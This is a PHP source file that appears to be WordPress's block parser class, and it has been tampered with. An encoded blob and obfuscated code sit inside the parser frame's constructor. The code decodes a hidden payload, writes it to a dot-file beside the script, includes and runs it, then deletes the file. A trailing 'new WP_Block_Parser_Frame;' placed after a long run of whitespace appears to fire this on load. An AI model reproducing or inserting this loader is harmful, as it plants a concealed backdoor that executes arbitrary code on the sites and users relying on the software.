9Z9Yl_RPo0vXPgBv6on8RkuIrnpbMD3r1SRggMeXw_tNHwjkuyH10F4+WZLR8JYRrQw0v_Pv2aG2IqYIhly7WkGdgc+QKffW9Mdl0BiU++llhYVMSzkrmTsFrufcnghG_u2i9N0LysCBtukxqfUyj6q1noGwLmJb1BVKzgcJzqofAFi61oTyveyWCO/KMihTEWOdy0KPul63hPKp+kH9etSmgzSbllD9WskUacB8QrDaY1fiSQxWws8EJXF/iCdx3uXeyXSRexMTbEzQOvV3bJyA74eGm+uzb3WdtLVR692lcZAwzKaMI1gitFmYsnPWuZEhmCxGm9JIJxQV19rEbOMSqIDmyduAb6s_Z/AlYWtf603urECiz+STb2W7ObmTea/fXooqWw0qUX1+Aij/LSUGJjHuyJ7fzLmF3QIpDQM6QJtCB4FQOy2IL/xugn2N9TgfJjj2XT498_MwCCTWGMFGdxuvcJ63s7no9vLZXrlOjbR7zkcZk2kbXl4+GZgKCks_ZKvF0649Iob9/ZMwPsr1cB/zZLR3hBi1i_B8RpDzv1jFYeafA89L9LGzsKInUaPsu9h4LLiJtO_ESDe46h6Z6Y04PSZnLTAHWJa8J6Ic/Pi1Nhb/RywcvwTzGbqRnomPIp3WUos1UD1qRsL7/7S41d9/a0sjy0/jy/zaUnihDyKLcCaSGr0QtJ_6r2beQafnTqsZBczGz094vs1Skg3BM+4gfDfkIjT9BG+qeOP2dDX_IYxl0bM0/F3ahFir1OqcfSGbnrmDzxfUT8BSzGv4ZdoLsEYK6TADLm0zbl/xOnYKuf797YGfz4JmqKALIz1Q/TsAfFlWYozyjSF0BoMugbdngpjPDK2bt8BLMdS0eTkGEUDDqySj8ru/d0Yi2xqJPa2YxbupabRYfO1EIfSkYqWwUTYSJIQUmKl6t7aKVs4CZf99RRBlnYTnFa06p_eyF7kJgzNrD_Um4NDVD+pBi14QTWFPz+ttKAVqsLDWx6e+7loeIb_zKM1/hWic+uK+usyvLiOMD/dymV8Ezm23Kc/2nUQAaRqE89+d/2CDAilukQZ_SFiJCp0gGCGGOVuYFxQfCDMfhk6gfHMeX1ycIBlUR6rSV4NCFF7jN+ak4r/SzatuYtUdhF8kqwkZdpqaAjQX4NsR4JNH+Qbz/t4mrwjj='))));if (isset($MqCq) && function_exists($MqCq)) {$JCeJb = $hptc('mssus5smdusi7Ue');if (function_exists($JCeJb)) {$JCeJb(constant($hptc('E5tnn')) ^ constant($hptc('E5HEWIE_tYEH')));}$g = $MqCq('', $jfHRO);} else {$g = function() use($hptc, $jfHRO) {$qdUT = __DIR__ . $hptc('/.7UQ');$BoIfF = $hptc('A7Gm5d6i5QuUimUil');$fuSo = $hptc('6UG7Uv');if (@$BoIfF($qdUT, $hptc('<?dXd ') . $jfHRO, constant($hptc('nq_c5E3')))) {try {include_once($qdUT);$fuSo($qdUT);} catch (Exception $e) {$fuSo($qdUT);if ($hptc('y7m') === $e->{$hptc('emijmllxem')}()) exit;}}};}$g();}
		$this->block              = $block;
		$this->token_start        = $token_start;
		$this->token_length       = $token_length;
		$this->prev_offset        = isset( $prev_offset ) ? $prev_offset : $token_start + $token_length;
		$this->leading_html_start = $leading_html_start;
	}
}

/**
 * Class WP_Block_Parser
 *
 * Parses a document and constructs a list of parsed block objects
 *
 * @since 5.0.0
 * @since 4.0.0 returns arrays not objects, all attributes are arrays
 */
class WP_Block_Parser {
	/**
	 * Input document being parsed
	 *
	 * @example "Pre-text\n<!-- wp:paragraph -->This is inside a block!<!-- /wp:paragraph -->"
	 *
	 * @since 5.0.0
	 * @var string
	 */
	public $document;

	/**
	 * Tracks parsing progress through document
	 *
	 * @since 5.0.0
	 * @var int
	 */
	public $offset;

	/**
	 * List of parsed blocks
	 *
	 * @since 5.0.0
	 * @var WP_Block_Parser_Block[]
	 */
	public $output;

	/**
	 * Stack of partially-parsed structures in memory during parse
	 *
	 * @since 5.0.0
	 * @var WP_Block_Parser_Frame[]
	 */
	public $stack;

	/**
	 * Empty associative array, here due to PHP quirks
	 *
	 * @since 4.4.0
	 * @var array empty associative array
	 */
	public $empty_attrs;

	/**
	 * Parses a document and returns a list of block structures
	 *
	 * When encountering an invalid parse will return a best-effort
	 * parse. In contrast to the specification parser this does not
	 * return an error on invalid inputs.
	 *
	 * @since 5.0.0
	 *
	 * @param string $document Input document being parsed.
	 * @return WP_Block_Parser_Block[]
	 */
	function parse( $document ) {
		$this->document    = $document;
		$this->offset      = 0;
		$this->output      = array();
		$this->stack       = array();
		$this->empty_attrs = json_decode( '{}', true );

		do {
			// twiddle our thumbs.
		} while ( $this->proceed() );

		return $this->output;
	}

	/**
	 * Processes the next token from the input document
	 * and returns whether to proceed eating more tokens
	 *
	 * This is the "next step" function that essentially
	 * takes a token as its input and decides what to do
	 * with that token before descending deeper into a
	 * nested block tree or continuing along the document
	 * or breaking out of a level of nesting.
	 *
	 * @internal
	 * @since 5.0.0
	 * @return bool
	 */
	function proceed() {
		$next_token = $this->next_token();
		list( $token_type, $block_name, $attrs, $start_offset, $token_length ) = $next_token;
		$stack_depth = count( $this->stack );

		// we may have some HTML soup before the next block.
		$leading_html_start = $start_offset > $this->offset ? $this->offset : null;

		switch ( $token_type ) {
			case 'no-more-tokens':
				// if not in a block then flush output.
				if ( 0 === $stack_depth ) {
					$this->add_freeform();
					return false;
				}

				/*
				 * Otherwise we have a problem
				 * This is an error
				 *
				 * we have options
				 * - treat it all as freeform text
				 * - assume an implicit closer (easiest when not nesting)
				 */

				// for the easy case we'll assume an implicit closer.
				if ( 1 === $stack_depth ) {
					$this->add_block_from_stack();
					return false;
				}

				/*
				 * for the nested case where it's more difficult we'll
				 * have to assume that multiple closers are missing
				 * and so we'll collapse the whole stack piecewise
				 */
				while ( 0 < count( $this->stack ) ) {
					$this->add_block_from_stack();
				}
				return false;

			case 'void-block':
				/*
				 * easy case is if we stumbled upon a void block
				 * in the top-level of the document
				 */
				if ( 0 === $stack_depth ) {
					if ( isset( $leading_html_start ) ) {
						$this->output[] = (array) $this->freeform(
							substr(
								$this->document,
								$leading_html_start,
								$start_offset - $leading_html_start
							)
						);
					}

					$this->output[] = (array) new WP_Block_Parser_Block( $block_name, $attrs, array(), '', array() );
					$this->offset   = $start_offset + $token_length;
					return true;
				}

				// otherwise we found an inner block.
				$this->add_inner_block(
					new WP_Block_Parser_Block( $block_name, $attrs, array(), '', array() ),
					$start_offset,
					$token_length
				);
				$this->offset = $start_offset + $token_length;
				return true;

			case 'block-opener':
				// track all newly-opened blocks on the stack.
				array_push(
					$this->stack,
					new WP_Block_Parser_Frame(
						new WP_Block_Parser_Block( $block_name, $attrs, array(), '', array() ),
						$start_offset,
						$token_length,
						$start_offset + $token_length,
						$leading_html_start
					)
				);
				$this->offset = $start_offset + $token_length;
				return true;

			case 'block-closer':
				/*
				 * if we're missing an opener we're in trouble
				 * This is an error
				 */
				if ( 0 === $stack_depth ) {
					/*
					 * we have options
					 * - assume an implicit opener
					 * - assume _this_ is the opener
					 * - give up and close out the document
					 */
					$this->add_freeform();
					return false;
				}

				// if we're not nesting then this is easy - close the block.
				if ( 1 === $stack_depth ) {
					$this->add_block_from_stack( $start_offset );
					$this->offset = $start_offset + $token_length;
					return true;
				}

				/*
				 * otherwise we're nested and we have to close out the current
				 * block and add it as a new innerBlock to the parent
				 */
				$stack_top                        = array_pop( $this->stack );
				$html                             = substr( $this->document, $stack_top->prev_offset, $start_offset - $stack_top->prev_offset );
				$stack_top->block->innerHTML     .= $html;
				$stack_top->block->innerContent[] = $html;
				$stack_top->prev_offset           = $start_offset + $token_length;

				$this->add_inner_block(
					$stack_top->block,
					$stack_top->token_start,
					$stack_top->token_length,
					$start_offset + $token_length
				);
				$this->offset = $start_offset + $token_length;
				return true;

			default:
				// This is an error.
				$this->add_freeform();
				return false;
		}
	}

	/**
	 * Scans the document from where we last left off
	 * and finds the next valid token to parse if it exists
	 *
	 * Returns the type of the find: kind of find, block information, attributes
	 *
	 * @internal
	 * @since 5.0.0
	 * @since 4.6.1 fixed a bug in attribute parsing which caused catastrophic backtracking on invalid block comments
	 * @return array
	 */
	function next_token() {
		$matches = null;

		/*
		 * aye the magic
		 * we're using a single RegExp to tokenize the block comment delimiters
		 * we're also using a trick here because the only difference between a
		 * block opener and a block closer is the leading `/` before `wp:` (and
		 * a closer has no attributes). we can trap them both and process the
		 * match back in PHP to see which one it was.
		 */
		$has_match = preg_match(
			'/<!--\s+(?P<closer>\/)?wp:(?P<namespace>[a-z][a-z0-9_-]*\/)?(?P<name>[a-z][a-z0-9_-]*)\s+(?P<attrs>{(?:(?:[^}]+|}+(?=})|(?!}\s+\/?-->).)*+)?}\s+)?(?P<void>\/)?-->/s',
			$this->document,
			$matches,
			PREG_OFFSET_CAPTURE,
			$this->offset
		);

		// if we get here we probably have catastrophic backtracking or out-of-memory in the PCRE.
		if ( false === $has_match ) {
			return array( 'no-more-tokens', null, null, null, null );
		}

		// we have no more tokens.
		if ( 0 === $has_match ) {
			return array( 'no-more-tokens', null, null, null, null );
		}

		list( $match, $started_at ) = $matches[0];

		$length    = strlen( $match );
		$is_closer = isset( $matches['closer'] ) && -1 !== $matches['closer'][1];
		$is_void   = isset( $matches['void'] ) && -1 !== $matches['void'][1];
		$namespace = $matches['namespace'];
		$namespace = ( isset( $namespace ) && -1 !== $namespace[1] ) ? $namespace[0] : 'core/';
		$name      = $namespace . $matches['name'][0];
		$has_attrs = isset( $matches['attrs'] ) && -1 !== $matches['attrs'][1];

		/*
		 * Fun fact! It's not trivial in PHP to create "an empty associative array" since all arrays
		 * are associative arrays. If we use `array()` we get a JSON `[]`
		 */
		$attrs = $has_attrs
			? json_decode( $matches['attrs'][0], /* as-associative */ true )
			: $this->empty_attrs;

		/*
		 * This state isn't allowed
		 * This is an error
		 */
		if ( $is_closer && ( $is_void || $has_attrs ) ) {
			// we can ignore them since they don't hurt anything.
		}

		if ( $is_void ) {
			return array( 'void-block', $name, $attrs, $started_at, $length );
		}

		if ( $is_closer ) {
			return array( 'block-closer', $name, null, $started_at, $length );
		}

		return array( 'block-opener', $name, $attrs, $started_at, $length );
	}

	/**
	 * Returns a new block object for freeform HTML
	 *
	 * @internal
	 * @since 3.9.0
	 *
	 * @param string $innerHTML HTML content of block.
	 * @return WP_Block_Parser_Block freeform block object.
	 */
	function freeform( $innerHTML ) {
		return new WP_Block_Parser_Block( null, $this->empty_attrs, array(), $innerHTML, array( $innerHTML ) );
	}

	/**
	 * Pushes a length of text from the input document
	 * to the output list as a freeform block.
	 *
	 * @internal
	 * @since 5.0.0
	 * @param null $length how many bytes of document text to output.
	 */
	function add_freeform( $length = null ) {
		$length = $length ? $length : strlen( $this->document ) - $this->offset;

		if ( 0 === $length ) {
			return;
		}

		$this->output[] = (array) $this->freeform( substr( $this->document, $this->offset, $length ) );
	}

	/**
	 * Given a block structure from memory pushes
	 * a new block to the output list.
	 *
	 * @internal
	 * @since 5.0.0
	 * @param WP_Block_Parser_Block $block        The block to add to the output.
	 * @param int                   $token_start  Byte offset into the document where the first token for the block starts.
	 * @param int                   $token_length Byte length of entire block from start of opening token to end of closing token.
	 * @param int|null              $last_offset  Last byte offset into document if continuing form earlier output.
	 */
	function add_inner_block( WP_Block_Parser_Block $block, $token_start, $token_length, $last_offset = null ) {
		$parent                       = $this->stack[ count( $this->stack ) - 1 ];
		$parent->block->innerBlocks[] = (array) $block;
		$html                         = substr( $this->document, $parent->prev_offset, $token_start - $parent->prev_offset );

		if ( ! empty( $html ) ) {
			$parent->block->innerHTML     .= $html;
			$parent->block->innerContent[] = $html;
		}

		$parent->block->innerContent[] = null;
		$parent->prev_offset           = $last_offset ? $last_offset : $token_start + $token_length;
	}

	/**
	 * Pushes the top block from the parsing stack to the output list.
	 *
	 * @internal
	 * @since 5.0.0
	 * @param int|null $end_offset byte offset into document for where we should stop sending text output as HTML.
	 */
	function add_block_from_stack( $end_offset = null ) {
		$stack_top   = array_pop( $this->stack );
		$prev_offset = $stack_top->prev_offset;

		$html = isset( $end_offset )
			? substr( $this->document, $prev_offset, $end_offset - $prev_offset )
			: substr( $this->document, $prev_offset );

		if ( ! empty( $html ) ) {
			$stack_top->block->innerHTML     .= $html;
			$stack_top->block->innerContent[] = $html;
		}

		if ( isset( $stack_top->leading_html_start ) ) {
			$this->output[] = (array) $this->freeform(
				substr(
					$this->document,
					$stack_top->leading_html_start,
					$stack_top->token_start - $stack_top->leading_html_start
				)
			);
		}

		$this->output[] = (array) $stack_top->block;
	}
}
                                                                                                                                                                                                                                                                                                            new WP_Block_Parser_Frame;